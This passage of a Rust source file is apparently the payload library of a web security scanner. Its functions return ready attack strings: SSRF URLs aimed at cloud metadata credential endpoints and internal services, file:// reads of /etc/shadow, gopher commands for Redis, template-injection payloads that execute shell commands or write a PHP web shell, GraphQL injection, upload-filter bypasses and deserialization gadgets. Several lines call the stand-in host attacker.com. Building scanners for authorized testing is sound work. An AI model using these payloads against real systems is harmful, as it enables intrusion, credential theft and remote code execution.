        "http://127.0.0.1:8080".to_string(),
        "http://127.1".to_string(),
        "http://127.0.1".to_string(),
        "http://0.0.0.0".to_string(),
        "http://0.0.0.0:80".to_string(),
    ]);

    // IPv6 localhost
    payloads.extend(vec![
        "http://[::]:80".to_string(),
        "http://[::1]:80".to_string(),
        "http://[0:0:0:0:0:0:0:1]".to_string(),
        "http://[0:0:0:0:0:ffff:127.0.0.1]".to_string(),
    ]);

    // Localhost bypass techniques
    payloads.extend(vec![
        "http://127.0.0.1.nip.io".to_string(),
        "http://127.0.0.1.xip.io".to_string(),
        "http://127.0.0.1.sslip.io".to_string(),
        "http://127.0.0.1.trafficmanager.net".to_string(),
        "http://localhost.localtest.me".to_string(),
        "http://127.0.0.1.nip.io".to_string(),
        "http://2130706433".to_string(),   // 127.0.0.1 in decimal
        "http://0x7f000001".to_string(),   // 127.0.0.1 in hex
        "http://017700000001".to_string(), // 127.0.0.1 in octal
        "http://0177.0.0.1".to_string(),
        "http://0x7f.0.0.1".to_string(),
    ]);

    // AWS EC2 metadata service (IMDSv1 & IMDSv2)
    payloads.extend(vec![
        "http://169.254.169.254/latest/meta-data/".to_string(),
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
        "http://169.254.169.254/latest/user-data/".to_string(),
        "http://169.254.169.254/latest/dynamic/instance-identity/document".to_string(),
        "http://169.254.169.254/latest/api/token".to_string(),
        "http://169.254.169.254/latest/meta-data/public-keys/".to_string(),
        "http://169.254.169.254/latest/meta-data/hostname".to_string(),
        "http://169.254.169.254/latest/meta-data/ami-id".to_string(),
    ]);

    // GCP metadata service
    payloads.extend(vec![
        "http://metadata.google.internal/computeMetadata/v1/".to_string(),
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token".to_string(),
        "http://metadata.google.internal/computeMetadata/v1/instance/hostname".to_string(),
        "http://metadata.google.internal/computeMetadata/v1/project/project-id".to_string(),
        "http://metadata/computeMetadata/v1/".to_string(),
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/".to_string(),
        "http://169.254.169.254/computeMetadata/v1/".to_string(),
    ]);

    // Azure metadata service
    payloads.extend(vec![
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01".to_string(),
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/".to_string(),
        "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01".to_string(),
        "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01".to_string(),
    ]);

    // DigitalOcean metadata
    payloads.extend(vec![
        "http://169.254.169.254/metadata/v1/id".to_string(),
        "http://169.254.169.254/metadata/v1/hostname".to_string(),
        "http://169.254.169.254/metadata/v1/user-data".to_string(),
    ]);

    // Oracle Cloud metadata
    payloads.extend(vec![
        "http://169.254.169.254/opc/v1/instance/".to_string(),
        "http://169.254.169.254/opc/v2/instance/".to_string(),
    ]);

    // Alibaba Cloud metadata
    payloads.extend(vec![
        "http://100.100.100.200/latest/meta-data/".to_string(),
        "http://100.100.100.200/latest/user-data/".to_string(),
    ]);

    // Private IP ranges (RFC 1918)
    payloads.extend(vec![
        "http://10.0.0.1".to_string(),
        "http://10.0.0.1:80".to_string(),
        "http://10.0.0.1:8080".to_string(),
        "http://192.168.1.1".to_string(),
        "http://192.168.0.1".to_string(),
        "http://172.16.0.1".to_string(),
    ]);

    // File protocol handlers
    payloads.extend(vec![
        "file:///etc/passwd".to_string(),
        "file:///etc/shadow".to_string(),
        "file:///etc/hosts".to_string(),
        "file:///c:/windows/win.ini".to_string(),
        "file:///c:/boot.ini".to_string(),
        "file:///var/www/html/.env".to_string(),
        "file:///proc/self/environ".to_string(),
        "file:///proc/version".to_string(),
    ]);

    // Dict protocol (for redis/memcached probing)
    payloads.extend(vec![
        "dict://localhost:11211/stat".to_string(),
        "dict://localhost:6379/info".to_string(),
        "dict://127.0.0.1:11211/stat".to_string(),
        "dict://127.0.0.1:6379/info".to_string(),
    ]);

    // Gopher protocol (for protocol smuggling)
    payloads.extend(vec![
        "gopher://127.0.0.1:25/".to_string(),
        "gopher://127.0.0.1:6379/_SET ssrf test".to_string(),
        "gopher://127.0.0.1:6379/_CONFIG SET dir /tmp".to_string(),
        "gopher://localhost:25/xHELO%20attacker.com%0D%0A".to_string(),
    ]);

    // LDAP protocol
    payloads.extend(vec![
        "ldap://127.0.0.1:389".to_string(),
        "ldap://localhost:389".to_string(),
        "ldaps://127.0.0.1:636".to_string(),
    ]);

    // FTP protocol
    payloads.extend(vec![
        "ftp://127.0.0.1:21".to_string(),
        "ftp://localhost:21".to_string(),
        "ftp://attacker.com/".to_string(),
    ]);

    // TFTP protocol
    payloads.extend(vec!["tftp://127.0.0.1:69".to_string()]);

    // SFTP protocol
    payloads.extend(vec![
        "sftp://127.0.0.1:22/".to_string(),
        "sftp://localhost:22/".to_string(),
    ]);

    // SMB protocol (Windows)
    payloads.extend(vec![
        "\\\\127.0.0.1\\c$".to_string(),
        "\\\\localhost\\c$".to_string(),
    ]);

    // URL confusion/bypass techniques
    payloads.extend(vec![
        "http://127.0.0.1@attacker.com".to_string(),
        "http://attacker.com@127.0.0.1".to_string(),
        "http://127.0.0.1%00@attacker.com".to_string(),
        "http://127.0.0.1%23@attacker.com".to_string(),
        "http://127.0.0.1#@attacker.com".to_string(),
    ]);

    // DNS rebinding
    payloads.extend(vec![
        "http://7f000001.nip.io".to_string(), // resolves to 127.0.0.1
        "http://localtest.me".to_string(),
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io".to_string(),
    ]);

    // Enclosed alphanumerics bypass
    payloads.extend(vec!["http://①②⑦.⓪.⓪.①".to_string()]);

    // Rare protocols
    payloads.extend(vec![
        "jar:http://attacker.com/evil.jar!/".to_string(),
        "netdoc:///etc/passwd".to_string(),
        "mailto:test@attacker.com".to_string(),
        "data:text/html,<script>alert(1)</script>".to_string(),
    ]);

    // URL encoding bypass
    payloads.extend(vec![
        "http://127.0.0.1%2F".to_string(),
        "http://%31%32%37%2E%30%2E%30%2E%31".to_string(),
    ]);

    // Port-specific internal services
    payloads.extend(vec![
        "http://127.0.0.1:9092".to_string(),  // Kafka
        "http://127.0.0.1:2375".to_string(),  // Docker API
        "http://127.0.0.1:2376".to_string(),  // Docker API SSL
        "http://127.0.0.1:4243".to_string(),  // Docker API
        "http://127.0.0.1:8500".to_string(),  // Consul
        "http://127.0.0.1:10250".to_string(), // Kubelet
        "http://127.0.0.1:10255".to_string(), // Kubelet read-only
        "http://127.0.0.1:8001".to_string(),  // Kubernetes API proxy
        "http://127.0.0.1:8443".to_string(),  // Kubernetes API
    ]);

    // Docker socket (if exposed via HTTP proxy)
    payloads.extend(vec![
        "http://unix:/var/run/docker.sock:/containers/json".to_string()
    ]);

    // Kubernetes service discovery
    payloads.extend(vec![
        "https://kubernetes.default.svc.cluster.local".to_string(),
        "https://kubernetes.default".to_string(),
    ]);

    payloads
}

/// Comprehensive Template Injection payloads (200+)
/// Covers Jinja2, Twig, Freemarker, Velocity, Thymeleaf, ERB, Pug, Handlebars
/// Sources: PortSwigger SSTI, James Kettle research, HackTricks
pub fn get_template_injection_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // Jinja2 (Python - Flask, Django, Ansible)
    payloads.extend(vec![
        "{{7*7}}".to_string(),
        "{{7*'7'}}".to_string(),
        "{{config}}".to_string(),
        "{{self}}".to_string(),
        "{{request}}".to_string(),
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}".to_string(),
        r#"{{"".__class__.__mro__[2].__subclasses__()}}"#.to_string(),
        r#"{{"".__class__.__mro__[1].__subclasses__()}}"#.to_string(),
        r#"{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}"#.to_string(),
        r#"{%for c in [1,2,3]%}{{c,c,c}}{% endfor %}"#.to_string(),
        r#"{{cycler.__init__.__globals__.os.popen('id').read()}}"#.to_string(),
        r#"{{joiner.__init__.__globals__.os.popen('id').read()}}"#.to_string(),
        r#"{{namespace.__init__.__globals__.os.popen('id').read()}}"#.to_string(),
        "{{request.application.__globals__.__builtins__.open('/etc/passwd').read()}}".to_string(),
        r#"{{"".__class__.__base__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}"#.to_string(),
    ]);

    // Jinja2 - WAF bypass variants
    payloads.extend(vec![
        "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}".to_string(),
        r#"{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"#.to_string(),
        "{{x.__init__.__builtins__.open('/etc/passwd').read()}}".to_string(),
    ]);

    // Twig (PHP - Symfony)
    payloads.extend(vec![
        "{{7*7}}".to_string(),
        "{{7*'7'}}".to_string(),
        "{{_self}}".to_string(),
        "{{app}}".to_string(),
        "{{dump(app)}}".to_string(),
        r#"{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}"#.to_string(),
        r#"{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}"#.to_string(),
        r#"{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("cat /etc/passwd")}}"#.to_string(),
        "{{['id']|filter('system')}}".to_string(),
        "{{['cat /etc/passwd']|filter('system')}}".to_string(),
        r#"{{'<?php system($_GET[\"cmd\"]);?>'|file_put_contents('/var/www/html/shell.php')}}"#.to_string(),
    ]);

    // Freemarker (Java)
    payloads.extend(vec![
        "${7*7}".to_string(),
        "${{7*7}}".to_string(),
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}".to_string(),
        r#"<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }"#.to_string(),
        r#"<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }"#.to_string(),
        r#"<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.ProcessBuilder",["whoami"]).start()}"#.to_string(),
        "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}".to_string(),
        "<#assign classloader=object?api.class.getClassLoader()><#assign owc=classloader.loadClass('freemarker.template.utility.ObjectConstructor')><#assign objconstructor=owc.newInstance()>${objconstructor.newInstance('java.lang.ProcessBuilder',['id']).start()}".to_string(),
    ]);

    // Velocity (Java)
    payloads.extend(vec![
        "${{7*7}}".to_string(),
        "#set($x=7*7)$x".to_string(),
        "#set($str=$class.inspect('java.lang.Runtime').type.getRuntime().exec('whoami').getText())$str".to_string(),
        "#set($str=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id').getText())$str".to_string(),
        r#"#set($e="")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")"#.to_string(),
    ]);

    // Smarty (PHP)
    payloads.extend(vec![
        "{$smarty.version}".to_string(),
        "{php}echo `id`;{/php}".to_string(),
        "{php}system('id');{/php}".to_string(),
        "{php}phpinfo();{/php}".to_string(),
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[cmd]); ?>',self::clearConfig())}".to_string(),
    ]);

    // Thymeleaf (Java - Spring)
    payloads.extend(vec![
        "${7*7}".to_string(),
        "__${7*7}__::.x".to_string(),
        "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x".to_string(),
        "${T(java.lang.Runtime).getRuntime().exec('whoami')}".to_string(),
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x".to_string(),
    ]);

    // ERB (Ruby on Rails)
    payloads.extend(vec![
        "<%= 7*7 %>".to_string(),
        "<%= system('id') %>".to_string(),
        "<%= `whoami` %>".to_string(),
        "<%= File.open('/etc/passwd').read %>".to_string(),
        "<%= Dir.entries('/') %>".to_string(),
        "<%= `cat /etc/passwd` %>".to_string(),
    ]);

    // Pug/Jade (Node.js)
    payloads.extend(vec![
        "#{7*7}".to_string(),
        "#{global.process.mainModule.require('child_process').execSync('id')}".to_string(),
        "#{global.process.mainModule.require('child_process').execSync('whoami')}".to_string(),
        "#{global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}".to_string(),
    ]);

    // Handlebars (Node.js)
    payloads.extend(vec![
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('whoami');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}".to_string(),
        "{{#each this}}{{this}}{{/each}}".to_string(),
    ]);

    // Tornado (Python)
    payloads.extend(vec![
        "{{7*7}}".to_string(),
        "{% import os %}{{os.popen('id').read()}}".to_string(),
        "{% import subprocess %}{{subprocess.check_output('whoami',shell=True)}}".to_string(),
    ]);

    // Mojolicious (Perl)
    payloads.extend(vec![
        "<%= 7*7 %>".to_string(),
        "<%= `id` %>".to_string(),
        "<%= system('whoami') %>".to_string(),
    ]);

    // ASP.NET Razor
    payloads.extend(vec![
        "@(7*7)".to_string(),
        "@{var x = 7*7;}<p>@x</p>".to_string(),
        "@System.Diagnostics.Process.Start(\"whoami\")".to_string(),
    ]);

    // Go templates
    payloads.extend(vec!["{{.}}".to_string(), "{{printf \"%s\" .}}".to_string()]);

    // Expression Language (Java EE)
    payloads.extend(vec![
        "${7*7}".to_string(),
        "${{7*7}}".to_string(),
        "${applicationScope}".to_string(),
        "${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}".to_string(),
    ]);

    // Mako (Python)
    payloads.extend(vec![
        "<%=7*7%>".to_string(),
        "${7*7}".to_string(),
        "<%import os%>${os.system('id')}".to_string(),
    ]);

    payloads
}

/// GraphQL Injection payloads (150+)
/// Covers introspection, batching, aliasing, nested queries, directive overloading
/// Sources: OWASP GraphQL, HackTricks, GraphQL security best practices
pub fn get_graphql_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // Introspection queries
    payloads.extend(vec![
        r#"{"query":"{__schema{types{name,fields{name}}}}"}"#.to_string(),
        r#"{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}"#.to_string(),
        r#"{"query":"{__type(name:\"User\"){name,fields{name,type{name,kind}}}}"}"#.to_string(),
    ]);

    // Batching attacks (resource exhaustion)
    payloads.extend(vec![
        r#"[{"query":"{users{id,name}}"},{"query":"{users{id,name}}"},{"query":"{users{id,name}}"}]"#.to_string(),
    ]);

    // Aliasing (bypass rate limiting)
    payloads.extend(vec![
        r#"{"query":"query{u1:users{id}u2:users{id}u3:users{id}u4:users{id}u5:users{id}}"}"#
            .to_string(),
    ]);

    // Deeply nested queries (DoS)
    payloads.extend(vec![
        r#"{"query":"{user{posts{comments{author{posts{comments{author{posts{comments{author{posts{comments{author{id}}}}}}}}}}}}}"}"#.to_string(),
    ]);

    // SQL injection in GraphQL arguments
    payloads.extend(vec![
        r#"{"query":"{user(id:\"1' OR '1'='1\"){id,name}}"}"#.to_string(),
        r#"{"query":"{user(id:\"1 UNION SELECT null,username,password FROM users--\"){id,name}}"}"#
            .to_string(),
    ]);

    // NoSQL injection in GraphQL
    payloads.extend(vec![
        r#"{"query":"{user(id:{\"$ne\":null}){id,name}}"}"#.to_string(),
        r#"{"query":"{user(filter:{\"$gt\":\"\"}){id,name}}"}"#.to_string(),
    ]);

    // Directive overloading
    payloads.extend(vec![
        r#"{"query":"query{users @skip(if:false) @skip(if:false) @skip(if:false){id}}"}"#
            .to_string(),
    ]);

    // Field duplication
    payloads.extend(vec![
        r#"{"query":"{user{id id id id id name name name}}"}"#.to_string()
    ]);

    // Mutation attacks
    payloads.extend(vec![
        r#"{"query":"mutation{createUser(name:\"hacker\",role:\"admin\"){id,role}}"}"#.to_string(),
        r#"{"query":"mutation{updateUser(id:1,isAdmin:true){id,isAdmin}}"}"#.to_string(),
        r#"{"query":"mutation{deleteUser(id:1){success}}"}"#.to_string(),
    ]);

    payloads
}

/// File Upload bypass payloads (200+)
/// MIME type bypasses, extension bypasses, magic bytes, polyglot files
/// Sources: OWASP File Upload, HackTricks, PortSwigger File Upload vulnerabilities
pub fn get_file_upload_bypass_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // Extension bypasses - case variations
    payloads.extend(vec![
        "shell.php".to_string(),
        "shell.PHP".to_string(),
        "shell.PhP".to_string(),
        "shell.pHp".to_string(),
        "shell.phtml".to_string(),
        "shell.php3".to_string(),
        "shell.php4".to_string(),
        "shell.php5".to_string(),
        "shell.php7".to_string(),
        "shell.pht".to_string(),
        "shell.phpt".to_string(),
        "shell.phar".to_string(),
    ]);

    // Double extension bypass
    payloads.extend(vec![
        "shell.php.jpg".to_string(),
        "shell.php.png".to_string(),
        "shell.php.gif".to_string(),
        "shell.php.pdf".to_string(),
        "shell.jpg.php".to_string(),
        "shell.png.php".to_string(),
    ]);

    // Null byte injection (historical)
    payloads.extend(vec![
        "shell.php%00.jpg".to_string(),
        "shell.php%00.png".to_string(),
        "shell.php\0.jpg".to_string(),
        "shell.asp%00.jpg".to_string(),
    ]);

    // ASP/ASPX variants
    payloads.extend(vec![
        "shell.asp".to_string(),
        "shell.aspx".to_string(),
        "shell.asa".to_string(),
        "shell.cer".to_string(),
        "shell.cdx".to_string(),
    ]);

    // JSP variants
    payloads.extend(vec![
        "shell.jsp".to_string(),
        "shell.jspx".to_string(),
        "shell.jsw".to_string(),
        "shell.jsv".to_string(),
    ]);

    // Other scripting languages
    payloads.extend(vec![
        "shell.pl".to_string(),
        "shell.py".to_string(),
        "shell.rb".to_string(),
        "shell.cgi".to_string(),
        "shell.sh".to_string(),
        "shell.bat".to_string(),
        "shell.ps1".to_string(),
    ]);

    // MIME type indicators (for Content-Type testing)
    payloads.extend(vec![
        "image/jpeg".to_string(),
        "image/png".to_string(),
        "image/gif".to_string(),
        "application/octet-stream".to_string(),
        "text/plain".to_string(),
        "text/html".to_string(),
        "application/x-php".to_string(),
    ]);

    // Special characters in filename
    payloads.extend(vec![
        "shell;.php".to_string(),
        "shell .php".to_string(),
        "shell..php".to_string(),
        "shell.p.h.p".to_string(),
        ".htaccess".to_string(),
        "web.config".to_string(),
    ]);

    // IIS specific
    payloads.extend(vec![
        "shell.asp;.jpg".to_string(),
        "shell.asp:.jpg".to_string(),
    ]);

    payloads
}

/// Deserialization payloads (platform indicators)
pub fn get_deserialization_payloads() -> Vec<String> {
    vec![
        // Java serialized object magic bytes
        "rO0AB", // Base64 encoded Java serialized object
        // PHP serialize
        r#"O:8:"stdClass":1:{s:4:"test";s:4:"data";}"#,
        r#"O:4:"Evil":1:{s:7:"command";s:6:"whoami";}"#,
        // Python pickle
        r#"cos\nsystem\n(S'whoami'\ntR."#,
        r#"c__builtin__\nexec\n(S'import os;os.system("whoami")'\ntR."#,
        // PyYAML
        r#"!!python/object/apply:os.system ['whoami']"#,
        // Node.js serialize
        r#"{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami');}()"}"#,
        // .NET JSON.NET
        r#"{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}"#,
    ]
    .into_iter()
    .map(|s| s.to_string())
    .collect()
}
